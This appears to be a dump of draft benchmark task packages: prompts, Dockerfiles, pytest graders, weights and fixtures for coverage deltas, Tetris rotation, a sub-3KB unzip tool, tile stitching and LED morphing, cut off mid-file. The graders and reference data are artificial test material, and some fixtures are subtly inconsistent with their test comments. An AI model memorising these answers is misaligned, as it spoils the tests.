draft_dp_01591001,medium,draft_dp_01591001,data-processing,"Calculate the coverage percentage change between before.xml and after.xml (both in Cobertura format). Save the delta to coverage_delta.txt as a number like ""3.45"" or ""-2.10"".",data-processing,python|data-extraction|file-operations,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Copy the coverage XML files
COPY before.xml /app/
COPY after.xml /app/

# Python's xml.etree.ElementTree is in the standard library, no extra packages needed","import os
import xml.etree.ElementTree as ET

def test_coverage_delta_file_exists():
    """"""Test that coverage_delta.txt was created.""""""
    assert os.path.exists('/app/coverage_delta.txt'), ""coverage_delta.txt file should exist""

def test_coverage_delta_value_correct():
    """"""Test that the coverage delta value is correctly calculated.""""""
    # Calculate expected value from the XML files
    before_tree = ET.parse('/app/before.xml')
    after_tree = ET.parse('/app/after.xml')
    
    before_root = before_tree.getroot()
    after_root = after_tree.getroot()
    
    # Get line-rate from package level
    before_rate = float(before_root.find('.//package').get('line-rate'))
    after_rate = float(after_root.find('.//package').get('line-rate'))
    
    expected_delta = (after_rate - before_rate) * 100
    
    # Read the actual result
    with open('/app/coverage_delta.txt', 'r') as f:
        actual_value = f.read().strip()
    
    # Convert to float and compare
    actual_float = float(actual_value)
    
    # Allow small tolerance for rounding differences
    assert abs(actual_float - expected_delta) < 0.01, f""Expected delta {expected_delta:.2f}, but got {actual_float}""","{""test_coverage_delta_file_exists"": 0.3, ""test_coverage_delta_value_correct"": 0.7}","{""before.xml"": ""<?xml version=\""1.0\"" encoding=\""UTF-8\""?>\n<coverage version=\""5.5\"" timestamp=\""1625150400000\"">\n  <sources>\n    <source>/app/src</source>\n  </sources>\n  <packages>\n    <package name=\""app\"" line-rate=\""0.7234\"" branch-rate=\""0.6789\"" complexity=\""0\"">\n      <classes>\n        <class name=\""app.utils\"" filename=\""utils.py\"" line-rate=\""0.8125\"" branch-rate=\""0.75\"" complexity=\""0\"">\n          <methods/>\n          <lines>\n            <line number=\""1\"" hits=\""1\""/>\n            <line number=\""2\"" hits=\""1\""/>\n            <line number=\""3\"" hits=\""1\""/>\n            <line number=\""4\"" hits=\""1\""/>\n            <line number=\""5\"" hits=\""0\""/>\n            <line number=\""6\"" hits=\""1\""/>\n            <line number=\""7\"" hits=\""1\""/>\n            <line number=\""8\"" hits=\""0\""/>\n            <line number=\""9\"" hits=\""1\""/>\n            <line number=\""10\"" hits=\""1\""/>\n            <line number=\""11\"" hits=\""1\""/>\n            <line number=\""12\"" hits=\""1\""/>\n            <line number=\""13\"" hits=\""1\""/>\n            <line number=\""14\"" hits=\""0\""/>\n            <line number=\""15\"" hits=\""1\""/>\n            <line number=\""16\"" hits=\""1\""/>\n          </lines>\n        </class>\n        <class name=\""app.main\"" filename=\""main.py\"" line-rate=\""0.6667\"" branch-rate=\""0.5\"" complexity=\""0\"">\n          <methods/>\n          <lines>\n            <line number=\""1\"" hits=\""1\""/>\n            <line number=\""2\"" hits=\""1\""/>\n            <line number=\""3\"" hits=\""1\""/>\n            <line number=\""4\"" hits=\""1\""/>\n            <line number=\""5\"" hits=\""0\""/>\n            <line number=\""6\"" hits=\""0\""/>\n            <line number=\""7\"" hits=\""1\""/>\n            <line number=\""8\"" hits=\""1\""/>\n            <line number=\""9\"" hits=\""0\""/>\n            <line number=\""10\"" hits=\""0\""/>\n            <line number=\""11\"" hits=\""1\""/>\n            <line number=\""12\"" hits=\""1\""/>\n          </lines>\n        </class>\n        <class name=\""app.config\"" filename=\""config.py\"" line-rate=\""0.9\"" branch-rate=\""1.0\"" complexity=\""0\"">\n          <methods/>\n          <lines>\n            <line number=\""1\"" hits=\""1\""/>\n            <line number=\""2\"" hits=\""1\""/>\n            <line number=\""3\"" hits=\""1\""/>\n            <line number=\""4\"" hits=\""1\""/>\n            <line number=\""5\"" hits=\""1\""/>\n            <line number=\""6\"" hits=\""1\""/>\n            <line number=\""7\"" hits=\""1\""/>\n            <line number=\""8\"" hits=\""0\""/>\n            <line number=\""9\"" hits=\""1\""/>\n            <line number=\""10\"" hits=\""1\""/>\n          </lines>\n        </class>\n      </classes>\n    </package>\n  </packages>\n</coverage>"", ""after.xml"": ""<?xml version=\""1.0\"" encoding=\""UTF-8\""?>\n<coverage version=\""5.5\"" timestamp=\""1625154000000\"">\n  <sources>\n    <source>/app/src</source>\n  </sources>\n  <packages>\n    <package name=\""app\"" line-rate=\""0.7692\"" branch-rate=\""0.7143\"" complexity=\""0\"">\n      <classes>\n        <class name=\""app.utils\"" filename=\""utils.py\"" line-rate=\""0.875\"" branch-rate=\""0.875\"" complexity=\""0\"">\n          <methods/>\n          <lines>\n            <line number=\""1\"" hits=\""1\""/>\n            <line number=\""2\"" hits=\""1\""/>\n            <line number=\""3\"" hits=\""1\""/>\n            <line number=\""4\"" hits=\""1\""/>\n            <line number=\""5\"" hits=\""1\""/>\n            <line number=\""6\"" hits=\""1\""/>\n            <line number=\""7\"" hits=\""1\""/>\n            <line number=\""8\"" hits=\""0\""/>\n            <line number=\""9\"" hits=\""1\""/>\n            <line number=\""10\"" hits=\""1\""/>\n            <line number=\""11\"" hits=\""1\""/>\n            <line number=\""12\"" hits=\""1\""/>\n            <line number=\""13\"" hits=\""1\""/>\n            <line number=\""14\"" hits=\""0\""/>\n            <line number=\""15\"" hits=\""1\""/>\n            <line number=\""16\"" hits=\""1\""/>\n          </lines>\n        </class>\n        <class name=\""app.main\"" filename=\""main.py\"" line-rate=\""0.75\"" branch-rate=\""0.625\"" complexity=\""0\"">\n          <methods/>\n          <lines>\n            <line number=\""1\"" hits=\""1\""/>\n            <line number=\""2\"" hits=\""1\""/>\n            <line number=\""3\"" hits=\""1\""/>\n            <line number=\""4\"" hits=\""1\""/>\n            <line number=\""5\"" hits=\""1\""/>\n            <line number=\""6\"" hits=\""0\""/>\n            <line number=\""7\"" hits=\""1\""/>\n            <line number=\""8\"" hits=\""1\""/>\n            <line number=\""9\"" hits=\""0\""/>\n            <line number=\""10\"" hits=\""0\""/>\n            <line number=\""11\"" hits=\""1\""/>\n            <line number=\""12\"" hits=\""1\""/>\n          </lines>\n        </class>\n        <class name=\""app.config\"" filename=\""config.py\"" line-rate=\""0.9\"" branch-rate=\""1.0\"" complexity=\""0\"">\n          <methods/>\n          <lines>\n            <line number=\""1\"" hits=\""1\""/>\n            <line number=\""2\"" hits=\""1\""/>\n            <line number=\""3\"" hits=\""1\""/>\n            <line number=\""4\"" hits=\""1\""/>\n            <line number=\""5\"" hits=\""1\""/>\n            <line number=\""6\"" hits=\""1\""/>\n            <line number=\""7\"" hits=\""1\""/>\n            <line number=\""8\"" hits=\""0\""/>\n            <line number=\""9\"" hits=\""1\""/>\n            <line number=\""10\"" hits=\""1\""/>\n          </lines>\n        </class>\n        <class name=\""app.database\"" filename=\""database.py\"" line-rate=\""0.6\"" branch-rate=\""0.5\"" complexity=\""0\"">\n          <methods/>\n          <lines>\n            <line number=\""1\"" hits=\""1\""/>\n            <line number=\""2\"" hits=\""1\""/>\n            <line number=\""3\"" hits=\""0\""/>\n            <line number=\""4\"" hits=\""0\""/>\n            <line number=\""5\"" hits=\""1\""/>\n          </lines>\n        </class>\n      </classes>\n    </package>\n  </packages>\n</coverage>""}",2025-07-22T17:57:54.350874+00:00,2025-07-22T17:57:54.402841+00:00
draft_dp_2d76a389,medium,draft_dp_2d76a389,games,The tetris rotation examples in /examples/*.json show each piece in all 4 states. Figure out the rotation pattern and implement rotate_clockwise() and rotate_counterclockwise() in tetris.py that handle all 7 pieces and boundary collisions.,games,python|numpy|algorithm-implementation,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /workspace

RUN pip install numpy

# Copy the partially implemented tetris module
COPY tetris.py /workspace/

# Create examples directory and copy rotation examples
RUN mkdir -p /workspace/examples
COPY I_piece.json /workspace/examples/
COPY O_piece.json /workspace/examples/
COPY T_piece.json /workspace/examples/
COPY S_piece.json /workspace/examples/
COPY Z_piece.json /workspace/examples/
COPY J_piece.json /workspace/examples/
COPY L_piece.json /workspace/examples/

CMD [""/bin/bash""]","import sys
import subprocess
import json
import numpy as np

def test_rotation_implementation():
    """"""Test that rotation methods are properly implemented""""""
    result = subprocess.run([sys.executable, '-c', '''
import sys
sys.path.insert(0, ""/workspace"")
from tetris import TetrisPiece, load_piece_rotations

# Test T piece rotation
t_data = load_piece_rotations(""T"")
piece = TetrisPiece(t_data[""rotations""][0][""shape""])

# Test that methods exist and don't raise NotImplementedError
try:
    piece.rotate_clockwise()
    piece.rotate_counterclockwise()
    print(""SUCCESS"")
except (NotImplementedError, AttributeError) as e:
    print(f""FAIL: {e}"")
'''], capture_output=True, text=True)
    
    assert result.returncode == 0
    assert ""SUCCESS"" in result.stdout
    assert ""FAIL"" not in result.stdout

def test_rotation_correctness():
    """"""Test that rotations match the expected patterns from examples""""""
    result = subprocess.run([sys.executable, '-c', '''
import sys
sys.path.insert(0, ""/workspace"")
from tetris import TetrisPiece, load_piece_rotations
import numpy as np

errors = []

# Test each piece type
for piece_type in [""I"", ""O"", ""T"", ""S"", ""Z"", ""J"", ""L""]:
    data = load_piece_rotations(piece_type)
    rotations = data[""rotations""]
    
    # Start with state 0
    piece = TetrisPiece(rotations[0][""shape""])
    
    # Test clockwise rotation through all states
    for i in range(4):
        expected_next = rotations[(i + 1) % 4][""shape""]
        piece.rotate_clockwise()
        
        if not np.array_equal(piece.shape, expected_next):
            errors.append(f""{piece_type} piece: clockwise rotation from state {i} failed"")
    
    # Test counterclockwise rotation
    piece = TetrisPiece(rotations[0][""shape""])
    piece.rotate_counterclockwise()
    expected = rotations[3][""shape""]
    
    if not np.array_equal(piece.shape, expected):
        errors.append(f""{piece_type} piece: counterclockwise rotation from state 0 failed"")

if errors:
    print(""ERRORS:"", "";"".join(errors))
else:
    print(""ALL_CORRECT"")
'''], capture_output=True, text=True)
    
    assert result.returncode == 0
    assert ""ALL_CORRECT"" in result.stdout
    assert ""ERRORS:"" not in result.stdout

def test_boundary_collision_handling():
    """"""Test that rotations handle boundary collisions properly""""""
    result = subprocess.run([sys.executable, '-c', '''
import sys
sys.path.insert(0, ""/workspace"")
from tetris import TetrisPiece, load_piece_rotations
import numpy as np

# Test I piece near right wall
i_data = load_piece_rotations(""I"")
piece = TetrisPiece(i_data[""rotations""][0][""shape""], position=(0, 7))

# This rotation should adjust position to avoid going out of bounds
piece.rotate_clockwise(board_width=10)

# Check that the piece is still within bounds
positions = piece.get_absolute_positions()
max_col = max(pos[1] for pos in positions)

if max_col >= 10:
    print(f""FAIL: Piece went out of bounds, max_col={max_col}"")
else:
    print(""BOUNDARY_OK"")

# Test rotation at bottom
piece2 = TetrisPiece(i_data[""rotations""][1][""shape""], position=(17, 0))
piece2.rotate_clockwise(board_height=20)

positions2 = piece2.get_absolute_positions()
max_row = max(pos[0] for pos in positions2)

if max_row >= 20:
    print(f""FAIL: Piece went below bottom, max_row={max_row}"")
else:
    print(""BOTTOM_OK"")
'''], capture_output=True, text=True)
    
    assert result.returncode == 0
    assert ""BOUNDARY_OK"" in result.stdout
    assert ""BOTTOM_OK"" in result.stdout
    assert ""FAIL:"" not in result.stdout","{""test_rotation_implementation"": 0.2, ""test_rotation_correctness"": 0.5, ""test_boundary_collision_handling"": 0.3}","{""L_piece.json"": ""{\n  \""name\"": \""L\"",\n  \""rotations\"": [\n    {\n      \""state\"": 0,\n      \""shape\"": [\n        [false, false, true],\n        [true, true, true],\n        [false, false, false]\n      ]\n    },\n    {\n      \""state\"": 1,\n      \""shape\"": [\n        [false, true, false],\n        [false, true, false],\n        [false, true, true]\n      ]\n    },\n    {\n      \""state\"": 2,\n      \""shape\"": [\n        [false, false, false],\n        [true, true, true],\n        [true, false, false]\n      ]\n    },\n    {\n      \""state\"": 3,\n      \""shape\"": [\n        [true, true, false],\n        [false, true, false],\n        [false, true, false]\n      ]\n    }\n  ]\n}"", ""Z_piece.json"": ""{\n  \""name\"": \""Z\"",\n  \""rotations\"": [\n    {\n      \""state\"": 0,\n      \""shape\"": [\n        [true, true, false],\n        [false, true, true],\n        [false, false, false]\n      ]\n    },\n    {\n      \""state\"": 1,\n      \""shape\"": [\n        [false, false, true],\n        [false, true, true],\n        [false, true, false]\n      ]\n    },\n    {\n      \""state\"": 2,\n      \""shape\"": [\n        [false, false, false],\n        [true, true, false],\n        [false, true, true]\n      ]\n    },\n    {\n      \""state\"": 3,\n      \""shape\"": [\n        [false, true, false],\n        [true, true, false],\n        [true, false, false]\n      ]\n    }\n  ]\n}"", ""I_piece.json"": ""{\n  \""name\"": \""I\"",\n  \""rotations\"": [\n    {\n      \""state\"": 0,\n      \""shape\"": [\n        [false, false, false, false],\n        [true, true, true, true],\n        [false, false, false, false],\n        [false, false, false, false]\n      ]\n    },\n    {\n      \""state\"": 1,\n      \""shape\"": [\n        [false, false, true, false],\n        [false, false, true, false],\n        [false, false, true, false],\n        [false, false, true, false]\n      ]\n    },\n    {\n      \""state\"": 2,\n      \""shape\"": [\n        [false, false, false, false],\n        [false, false, false, false],\n        [true, true, true, true],\n        [false, false, false, false]\n      ]\n    },\n    {\n      \""state\"": 3,\n      \""shape\"": [\n        [false, true, false, false],\n        [false, true, false, false],\n        [false, true, false, false],\n        [false, true, false, false]\n      ]\n    }\n  ]\n}"", ""J_piece.json"": ""{\n  \""name\"": \""J\"",\n  \""rotations\"": [\n    {\n      \""state\"": 0,\n      \""shape\"": [\n        [true, false, false],\n        [true, true, true],\n        [false, false, false]\n      ]\n    },\n    {\n      \""state\"": 1,\n      \""shape\"": [\n        [false, true, true],\n        [false, true, false],\n        [false, true, false]\n      ]\n    },\n    {\n      \""state\"": 2,\n      \""shape\"": [\n        [false, false, false],\n        [true, true, true],\n        [false, false, true]\n      ]\n    },\n    {\n      \""state\"": 3,\n      \""shape\"": [\n        [false, true, false],\n        [false, true, false],\n        [true, true, false]\n      ]\n    }\n  ]\n}"", ""T_piece.json"": ""{\n  \""name\"": \""T\"",\n  \""rotations\"": [\n    {\n      \""state\"": 0,\n      \""shape\"": [\n        [false, true, false],\n        [true, true, true],\n        [false, false, false]\n      ]\n    },\n    {\n      \""state\"": 1,\n      \""shape\"": [\n        [false, true, false],\n        [false, true, true],\n        [false, true, false]\n      ]\n    },\n    {\n      \""state\"": 2,\n      \""shape\"": [\n        [false, false, false],\n        [true, true, true],\n        [false, true, false]\n      ]\n    },\n    {\n      \""state\"": 3,\n      \""shape\"": [\n        [false, true, false],\n        [true, true, false],\n        [false, true, false]\n      ]\n    }\n  ]\n}"", ""O_piece.json"": ""{\n  \""name\"": \""O\"",\n  \""rotations\"": [\n    {\n      \""state\"": 0,\n      \""shape\"": [\n        [true, true],\n        [true, true]\n      ]\n    },\n    {\n      \""state\"": 1,\n      \""shape\"": [\n        [true, true],\n        [true, true]\n      ]\n    },\n    {\n      \""state\"": 2,\n      \""shape\"": [\n        [true, true],\n        [true, true]\n      ]\n    },\n    {\n      \""state\"": 3,\n      \""shape\"": [\n        [true, true],\n        [true, true]\n      ]\n    }\n  ]\n}"", ""S_piece.json"": ""{\n  \""name\"": \""S\"",\n  \""rotations\"": [\n    {\n      \""state\"": 0,\n      \""shape\"": [\n        [false, true, true],\n        [true, true, false],\n        [false, false, false]\n      ]\n    },\n    {\n      \""state\"": 1,\n      \""shape\"": [\n        [false, true, false],\n        [false, true, true],\n        [false, false, true]\n      ]\n    },\n    {\n      \""state\"": 2,\n      \""shape\"": [\n        [false, false, false],\n        [false, true, true],\n        [true, true, false]\n      ]\n    },\n    {\n      \""state\"": 3,\n      \""shape\"": [\n        [true, false, false],\n        [true, true, false],\n        [false, true, false]\n      ]\n    }\n  ]\n}"", ""tetris.py"": ""import numpy as np\nimport json\n\nclass TetrisPiece:\n    def __init__(self, shape, position=(0, 0)):\n        self.shape = np.array(shape, dtype=bool)\n        self.position = position\n        self.rotation_state = 0\n    \n    def rotate_clockwise(self, board_width=10, board_height=20):\n        raise NotImplementedError(\""rotate_clockwise not implemented\"")\n    \n    def rotate_counterclockwise(self, board_width=10, board_height=20):\n        raise NotImplementedError(\""rotate_counterclockwise not implemented\"")\n    \n    def get_absolute_positions(self):\n        \""\""\""Get absolute positions of filled cells on the board\""\""\""\n        positions = []\n        for i in range(self.shape.shape[0]):\n            for j in range(self.shape.shape[1]):\n                if self.shape[i, j]:\n                    positions.append((self.position[0] + i, self.position[1] + j))\n        return positions\n\ndef load_piece_rotations(piece_type):\n    \""\""\""Load rotation examples for a piece type\""\""\""\n    with open(f'/workspace/examples/{piece_type}_piece.json', 'r') as f:\n        return json.load(f)""}",2025-07-22T17:57:01.810282+00:00,2025-07-22T20:45:48.990211+00:00
draft_dp_a3c2a549,extremely_hard,draft_dp_a3c2a549,software-engineering,"Need a minimal ZIP decompressor that handles DEFLATE compression. Must compile to under 3KB binary - we're embedding it in a bootloader. Implement from scratch, no zlib.",software-engineering,C|compression|optimization,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y \
    gcc \
    g++ \
    make \
    python3 \
    python3-pip \
    python3-pytest \
    binutils \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /challenge

COPY create_test_zips.py .
COPY Makefile .
COPY README_internal.txt .

RUN python3 create_test_zips.py

CMD [""/bin/bash""]","import os
import subprocess
import hashlib

def test_binary_size_under_3kb():
    """"""Test that the compiled unzip binary is under 3KB.""""""
    # Check if binary exists
    if not os.path.exists('/challenge/unzip'):
        assert False, ""unzip binary not found""
    
    # Get file size
    size = os.path.getsize('/challenge/unzip')
    assert size < 3072, f""Binary size {size} bytes exceeds 3KB limit""

def test_decompress_simple_zip():
    """"""Test that the unzip tool can decompress a simple ZIP file correctly.""""""
    # Clean up any existing output
    if os.path.exists('/challenge/hello.txt'):
        os.remove('/challenge/hello.txt')
    
    # Run the unzip tool
    result = subprocess.run(['/challenge/unzip', '/challenge/test1.zip'], 
                          capture_output=True, text=True)
    
    # Check that extraction succeeded
    assert os.path.exists('/challenge/hello.txt'), ""Failed to extract hello.txt from test1.zip""
    
    # Verify content is correct
    with open('/challenge/hello.txt', 'r') as f:
        content = f.read()
    
    assert content == 'Hello, World!\n', f""Extracted content incorrect: {repr(content)}""","{""test_binary_size_under_3kb"": 0.3, ""test_decompress_simple_zip"": 0.7}","{""README_internal.txt"": ""Current status:\n- Started implementing ZIP parser\n- Got stuck on DEFLATE decompression \n- Binary size already at 2.8KB with just basic parsing\n- Need to optimize further and add Huffman decoder"", ""Makefile"": ""CC = gcc\nCFLAGS = -Os -s -fno-stack-protector -fomit-frame-pointer -nostdlib -static\nLDFLAGS = -Wl,--gc-sections\n\nTARGET = unzip\nSRC = unzip.c\n\nall: $(TARGET)\n\t@echo \""Binary size:\""\n\t@ls -la $(TARGET)\n\t@size $(TARGET)\n\n$(TARGET): $(SRC)\n\t$(CC) $(CFLAGS) $(LDFLAGS) -o $(TARGET) $(SRC)\n\tstrip -s $(TARGET)\n\nclean:\n\trm -f $(TARGET)\n\ntest: $(TARGET)\n\t./$(TARGET) test1.zip\n\t@echo \""Extracted file content:\""\n\t@cat hello.txt\n\n.PHONY: all clean test"", ""create_test_zips.py"": ""#!/usr/bin/env python3\nimport zipfile\nimport os\n\n# Create test directory\nos.makedirs('test_files', exist_ok=True)\n\n# Create a simple text file\nwith open('test_files/hello.txt', 'w') as f:\n    f.write('Hello, World!\\n')\n\n# Create a larger text file\nwith open('test_files/lorem.txt', 'w') as f:\n    f.write('Lorem ipsum dolor sit amet, consectetur adipiscing elit. ' * 50 + '\\n')\n\n# Create a binary file\nwith open('test_files/binary.dat', 'wb') as f:\n    f.write(bytes(range(256)) * 4)\n\n# Create ZIP files with different compression levels\n# Simple ZIP with one small file\nwith zipfile.ZipFile('test1.zip', 'w', zipfile.ZIP_DEFLATED, compresslevel=6) as zf:\n    zf.write('test_files/hello.txt', 'hello.txt')\n\n# ZIP with larger text file\nwith zipfile.ZipFile('test2.zip', 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zf:\n    zf.write('test_files/lorem.txt', 'lorem.txt')\n\n# ZIP with binary data\nwith zipfile.ZipFile('test3.zip', 'w', zipfile.ZIP_DEFLATED, compresslevel=1) as zf:\n    zf.write('test_files/binary.dat', 'binary.dat')\n\n# ZIP with no compression (stored)\nwith zipfile.ZipFile('test4.zip', 'w', zipfile.ZIP_STORED) as zf:\n    zf.write('test_files/hello.txt', 'stored.txt')\n\nprint(\""Test ZIP files created successfully\"")""}",2025-07-22T17:52:42.257449+00:00,2025-07-22T17:58:07.050784+00:00
draft_dp_d9457932,hard,draft_dp_d9457932,software-engineering,Need a tile stitching algorithm that matches boundary patterns. Got sample tiles in tiles/ - check the boundary codes and assemble valid maps. Should handle rotations too.,software-engineering,python|algorithm-implementation|numpy,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

# Install numpy for array operations
RUN pip install numpy

# Copy the partial implementation and tile generation
COPY stitcher.py /app/
COPY generate_tiles.py /app/

# Generate sample tiles
RUN python generate_tiles.py

# Create a simple test script to verify tiles exist
RUN echo ""import os; print('Tiles:', os.listdir('tiles/'))"" > check_tiles.py","import subprocess
import json
import os

def test_boundary_matching():
    """"""Test that the stitcher correctly validates boundary matches""""""
    # Run a test script that checks boundary matching
    test_script = """"""
import sys
sys.path.append('/app')
from stitcher import TileStitcher
import numpy as np

# Load tiles
tile1 = np.load('/app/tiles/tile_001.npy')
tile2 = np.load('/app/tiles/tile_002.npy')

stitcher = TileStitcher()

# Test matching edges (tile2 right should match tile1 left)
# tile1 left edge is all 1s (water)
# tile2 right edge should be all 1s (water) to match
result = stitcher.check_boundary_match(tile1, 'left', tile2, 'right')
if result:
    print(""MATCH_VALID"")
else:
    print(""MATCH_INVALID"")
""""""
    
    result = subprocess.run(
        ['python', '-c', test_script],
        capture_output=True,
        text=True,
        cwd='/app'
    )
    
    assert result.returncode == 0, f""Script failed: {result.stderr}""
    assert ""MATCH_VALID"" in result.stdout, ""Boundary matching not implemented correctly""

def test_map_assembly():
    """"""Test that the stitcher can assemble a complete map from tiles""""""
    # Run assembly and compare with reference
    test_script = """"""
import sys
sys.path.append('/app')
from stitcher import TileStitcher
import numpy as np
import json

# Load reference assembly
with open('/app/tiles/reference_assembly.json', 'r') as f:
    reference = json.load(f)

stitcher = TileStitcher()
stitcher.load_tiles('/app/tiles')

# Assemble the map
assembled = stitcher.assemble_map(list(stitcher.tiles.keys()))

# Check if assembly matches reference structure
if assembled is not None and len(assembled) == 2 and len(assembled[0]) == 2:
    print(""ASSEMBLY_COMPLETE"")
else:
    print(""ASSEMBLY_FAILED"")
""""""
    
    result = subprocess.run(
        ['python', '-c', test_script],
        capture_output=True,
        text=True,
        cwd='/app'
    )
    
    assert result.returncode == 0, f""Script failed: {result.stderr}""
    assert ""ASSEMBLY_COMPLETE"" in result.stdout, ""Map assembly not working correctly""","{""test_boundary_matching"": 0.4, ""test_map_assembly"": 0.6}","{""generate_tiles.py"": ""import numpy as np\nimport os\nimport json\n\ndef generate_sample_tiles():\n    \""\""\""Generate sample tiles with boundary codes\""\""\""\n    \n    # Define boundary codes:\n    # 0 = grass, 1 = water, 2 = mountain, 3 = desert\n    \n    # Create tiles directory\n    os.makedirs('tiles', exist_ok=True)\n    \n    # Tile 1: grass center with mixed edges\n    tile1 = np.zeros((10, 10), dtype=int)\n    tile1[:, 0] = 1  # left edge water\n    tile1[:, -1] = 2  # right edge mountain\n    tile1[0, :] = 0  # top edge grass\n    tile1[-1, :] = 3  # bottom edge desert\n    np.save('tiles/tile_001.npy', tile1)\n    \n    # Tile 2: water center, matches tile1's left edge\n    tile2 = np.ones((10, 10), dtype=int)\n    tile2[:, 0] = 0  # left edge grass\n    tile2[:, -1] = 1  # right edge water (matches tile1 left)\n    tile2[0, :] = 1  # top edge water\n    tile2[-1, :] = 1  # bottom edge water\n    np.save('tiles/tile_002.npy', tile2)\n    \n    # Tile 3: mountain center, matches tile1's right edge\n    tile3 = np.full((10, 10), 2, dtype=int)\n    tile3[:, 0] = 2  # left edge mountain (matches tile1 right)\n    tile3[:, -1] = 3  # right edge desert\n    tile3[0, :] = 2  # top edge mountain\n    tile3[-1, :] = 0  # bottom edge grass\n    np.save('tiles/tile_003.npy', tile3)\n    \n    # Tile 4: desert center\n    tile4 = np.full((10, 10), 3, dtype=int)\n    tile4[:, 0] = 3  # left edge desert\n    tile4[:, -1] = 0  # right edge grass\n    tile4[0, :] = 3  # top edge desert (matches tile1 bottom)\n    tile4[-1, :] = 2  # bottom edge mountain\n    np.save('tiles/tile_004.npy', tile4)\n    \n    # Save boundary matching rules\n    rules = {\n        \""matching_rules\"": \""Tiles can connect if their touching edges have the same boundary code\"",\n        \""codes\"": {\n            \""0\"": \""grass\"",\n            \""1\"": \""water\"", \n            \""2\"": \""mountain\"",\n            \""3\"": \""desert\""\n        }\n    }\n    \n    with open('tiles/rules.json', 'w') as f:\n        json.dump(rules, f, indent=2)\n    \n    # Save a reference assembly (2x2 grid)\n    # [tile2, tile1]\n    # [tile4, tile3]\n    reference = {\n        \""grid\"": [\n            [\""tile_002.npy\"", \""tile_001.npy\""],\n            [\""tile_004.npy\"", \""tile_003.npy\""]\n        ],\n        \""rotations\"": [\n            [0, 0],\n            [1, 0]  # tile4 needs 90 degree rotation\n        ]\n    }\n    \n    with open('tiles/reference_assembly.json', 'w') as f:\n        json.dump(reference, f, indent=2)\n\nif __name__ == \""__main__\"":\n    generate_sample_tiles()\n    print(\""Sample tiles generated in tiles/\"")"", ""stitcher.py"": ""import numpy as np\nimport os\nimport json\n\nclass TileStitcher:\n    def __init__(self):\n        self.tiles = {}\n        self.boundary_rules = None\n        \n    def load_tiles(self, tile_dir):\n        \""\""\""Load all tiles from directory\""\""\""\n        pass\n        \n    def check_boundary_match(self, tile1, edge1, tile2, edge2):\n        \""\""\""Check if two tile edges can connect\""\""\""\n        pass\n        \n    def rotate_tile(self, tile, rotations):\n        \""\""\""Rotate tile by 90 degree increments\""\""\""\n        pass\n        \n    def find_valid_positions(self, tile, partial_map):\n        \""\""\""Find all valid positions where tile can be placed\""\""\""\n        pass\n        \n    def assemble_map(self, tiles):\n        \""\""\""Assemble complete map from tiles\""\""\""\n        pass\n\nif __name__ == \""__main__\"":\n    stitcher = TileStitcher()\n    # Load tiles and assemble""}",2025-07-22T17:56:04.037039+00:00,2025-07-22T20:46:11.764990+00:00
draft_dp_5c52cb87,medium,draft_dp_5c52cb87,software-engineering,The LED animation sequencer crashes when morphing between patterns. Fix it to generate smooth transitions (min 10 fps) for the example animations in animations/.,software-engineering,python|debugging|numpy,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN pip install numpy

COPY sequencer.py /app/
COPY animations/ /app/animations/

CMD [""bash""]","import subprocess
import json
import os

def test_animation_morphing():
    """"""Test that animation morphing works without crashing and produces smooth transitions.""""""
    # Run the sequencer to generate morphed animation
    result = subprocess.run(
        ['python', '/app/sequencer.py', 'morph', '/app/animations/pattern1.json', '/app/animations/pattern2.json', '/app/morphed_output.json'],
        capture_output=True,
        text=True
    )
    
    # Should not crash
    assert result.returncode == 0, f""Sequencer crashed: {result.stderr}""
    
    # Check output file exists
    assert os.path.exists('/app/morphed_output.json'), ""Output animation file not created""
    
    # Load and validate the morphed animation
    with open('/app/morphed_output.json', 'r') as f:
        animation = json.load(f)
    
    # Should have frames
    assert 'frames' in animation, ""Animation missing frames""
    assert len(animation['frames']) > 0, ""No frames generated""
    
    # Check frame rate (at least 10 fps)
    if 'fps' in animation:
        assert animation['fps'] >= 10, f""Frame rate too low: {animation['fps']} fps""

def test_smooth_transitions():
    """"""Test that transitions between frames are smooth (no abrupt changes).""""""
    # Generate a test transition
    result = subprocess.run(
        ['python', '/app/sequencer.py', 'morph', '/app/animations/pattern1.json', '/app/animations/pattern2.json', '/app/test_smooth.json'],
        capture_output=True,
        text=True
    )
    
    assert result.returncode == 0, f""Sequencer failed: {result.stderr}""
    
    # Load the generated animation
    with open('/app/test_smooth.json', 'r') as f:
        animation = json.load(f)
    
    frames = animation['frames']
    
    # Check transitions between consecutive frames
    max_change = 0
    for i in range(1, len(frames)):
        prev_frame = frames[i-1]
        curr_frame = frames[i]
        
        # Calculate maximum brightness change between frames
        for row_idx in range(len(prev_frame)):
            for col_idx in range(len(prev_frame[row_idx])):
                change = abs(curr_frame[row_idx][col_idx] - prev_frame[row_idx][col_idx])
                max_change = max(max_change, change)
    
    # Smooth transitions should not have abrupt changes (e.g., max 50 brightness units per frame)
    assert max_change <= 50, f""Transitions too abrupt: max change {max_change} brightness units""","{""test_animation_morphing"": 0.6, ""test_smooth_transitions"": 0.4}","{""sequencer.py"": ""#!/usr/bin/env python3\nimport json\nimport sys\nimport numpy as np\n\ndef load_animation(filepath):\n    \""\""\""Load an animation from JSON file.\""\""\""\n    with open(filepath, 'r') as f:\n        return json.load(f)\n\ndef save_animation(animation, filepath):\n    \""\""\""Save animation to JSON file.\""\""\""\n    with open(filepath, 'w') as f:\n        json.dump(animation, f, indent=2)\n\ndef morph_patterns(pattern1, pattern2, steps=10):\n    \""\""\""Morph between two LED patterns.\""\""\""\n    frames1 = pattern1['frames']\n    frames2 = pattern2['frames']\n    \n    # Get the first frame from each pattern\n    start_frame = np.array(frames1[0])\n    end_frame = np.array(frames2[0])\n    \n    morphed_frames = []\n    \n    for i in range(steps):\n        alpha = i / steps\n        frame = start_frame + (end_frame - start_frame) * alpha\n        morphed_frames.append(frame)\n    \n    return {\n        'frames': morphed_frames,\n        'fps': 15\n    }\n\ndef main():\n    if len(sys.argv) < 5:\n        print(\""Usage: python sequencer.py morph <pattern1.json> <pattern2.json> <output.json>\"")\n        sys.exit(1)\n    \n    command = sys.argv[1]\n    \n    if command == 'morph':\n        